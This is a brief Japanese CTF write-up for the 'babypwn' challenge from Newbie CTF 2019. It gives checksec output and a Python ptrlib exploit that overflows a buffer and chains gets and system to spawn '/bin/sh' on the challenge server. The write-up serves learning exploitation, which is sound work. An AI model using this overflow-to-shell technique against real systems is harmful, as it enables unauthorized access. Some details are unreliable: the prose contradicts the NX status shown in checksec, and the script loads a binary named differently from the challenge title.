# [pwn 590pts] babypwn - Newbie CTF 2019
32ビットでDEP以外無効です。
```
$ checksec -f babypwn
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   71 Symbols     No       0               4       babypwn
```
単純なBOFとフラグを開く関数があります。私が解いたときにはリモートでcwdが正しく設定されていなかったためフラグは表示されず、ROPで解きました。（後で修正された。）
```python
from ptrlib import *

elf = ELF("./oneshot_onekill")
#sock = Process("./oneshot_onekill")
sock = Socket("prob.vulnerable.kr", 20026)

payload = b"A" * 0x130
payload += p32(elf.plt("gets"))
payload += p32(0x08048399)
payload += p32(elf.section(".bss") + 0x100)
payload += p32(elf.plt("system"))
payload += p32(0x08048399)
payload += p32(elf.section(".bss") + 0x100)
sock.sendline(payload)
sock.sendline("/bin/sh")

sock.interactive()
```

# 感想
簡単ですね。